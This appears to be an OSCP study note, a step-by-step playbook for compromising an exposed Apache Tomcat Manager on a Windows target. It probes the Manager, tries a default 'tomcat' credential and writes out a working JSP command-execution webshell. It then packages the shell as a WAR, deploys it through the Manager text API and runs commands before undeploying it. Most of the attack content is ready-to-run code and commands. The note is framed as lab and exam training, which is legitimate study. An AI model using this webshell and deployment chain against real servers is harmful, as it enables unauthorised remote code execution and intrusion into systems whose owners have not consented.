# Windows - Web - Tomcat

**Windows web supplement to Step 23 · Windows**

*Use this page when the service scan identifies Apache Tomcat and the Manager application is exposed.*

## 1. Check the Tomcat Manager

The Manager is Tomcat's administrative web application. Check the status without saving the full page so you can distinguish an absent path from a protected one.

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://$BoxIP:$WebPort/manager/html
```

- `200` means the page is accessible.
- `401` means the Manager exists and needs authentication.
- `403` means the path exists but access is blocked by policy.
- `404` means this path is not present.

Test one likely default credential manually before using a wordlist. Tomcat local users and roles are commonly defined in `tomcat-users.xml`.

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
boxset Username tomcat
boxset Password $Password
curl -s -o /dev/null -w "%{http_code}\n" -u $Username:$Password http://$BoxIP:$WebPort/manager/html
loot cred $Username $Password
```

## 2. Create a WAR webshell

JSP is Java Server Pages, which Tomcat compiles and executes. A WAR file is a ZIP-form Java web application archive. Package a minimal JSP command page so Tomcat can deploy it.

> **Why:** This command gathers the windows web tomcat evidence needed to decide which documented route applies next.
```bash
cat > /tmp/cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", request.getParameter("cmd")});
BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = r.readLine()) != null) out.println(line + "<br>");
%>
EOF
cd /tmp && zip $BoxName.war cmd.jsp
mv /tmp/$BoxName.war $BoxDir/www/$BoxName.war
cd $BoxDir
```

The argument array gives Java the executable, shell switch, and command separately. This avoids unreliable parsing of a single command string.

## 3. Deploy and execute the JSP

The text API accepts a simple HTTP request and returns plain text, so it is easier to reproduce than browser-based Manager navigation.

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -u $Username:$Password \
  --upload-file $BoxDir/www/$BoxName.war \
  "http://$BoxIP:$WebPort/manager/text/deploy?path=/$BoxName&update=true"
```

Expected output:

```text
OK - Deployed application at context path /$BoxName
```

Call the JSP with `-G` and `--data-urlencode`. The first keeps the command in the query string. The second safely encodes spaces, backslashes, and other characters.

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -G "http://$BoxIP:$WebPort/$BoxName/cmd.jsp" \
  --data-urlencode "cmd=whoami"
```

If the command runs as SYSTEM, continue to the flag check or Step 33, Windows Clean Down. If it runs as a low-privilege account, continue to Step 28, Windows Privilege Triage.

> [!warning] 💡
> Filenames with spaces need a quoted Windows path and careful Bash quoting. Use `--data-urlencode` rather than manually replacing spaces with `+`, because backslashes and shell metacharacters can be altered.

> [!warning] 💡
> After deployment, the JSP is a public application path. Calling `/$BoxName/cmd.jsp` does not require Manager credentials, so remove it as soon as testing is complete.

## 4. Remove and verify the application

Use the text API's undeploy command to remove the web application, then request the old JSP and require a `404` response.

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -u $Username:$Password \
  "http://$BoxIP:$WebPort/manager/text/undeploy?path=/$BoxName"
curl -s -o /dev/null -w "%{http_code}\n" \
  "http://$BoxIP:$WebPort/$BoxName/cmd.jsp"
```

Expected output:

```text
OK - Undeployed application at context path /$BoxName
404
```

## What did you get?

- [ ] Manager returns `200` with valid credentials → **Deploy the temporary WAR, call `cmd.jsp?cmd=whoami`, and go to Step 27 · [[Windows - Shell Received]]**
- [ ] Manager returns `401` or `403` → **The application exists but the credential or access policy is wrong; return to Step 23 · [[Windows - Web Enum]]**
- [ ] The JSP returns a low-privilege identity → **Go to Step 28 · [[Windows - Privilege Triage]]**
- [ ] The deployment or command request fails → **Run `curl -i` against the Manager endpoint, verify the Manager role and WAR path, URL-encode the `cmd` value, and retry once**
- [ ] Undeploy returns `OK` and the JSP returns `404` → **Cleanup is verified; continue to Step 33 · [[Windows - Clean Down]]**

## Gotcha

> [!warning] 💡
> A Tomcat Manager credential can deploy applications, while the deployed application's URL may be callable without authentication. Treat the WAR as a temporary webshell and verify its URL is gone.

## External Resources

- [Apache Tomcat 7 Manager App HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)
- [Apache Tomcat 7 HTML Manager HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/html-manager-howto.html)
- [Apache Tomcat 7 Windows Service HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/windows-service-howto.html)
- [HackTricks: Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [PayloadsAllTheThings: Web Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Shells)
## Seen in
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- Windows technique reference

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
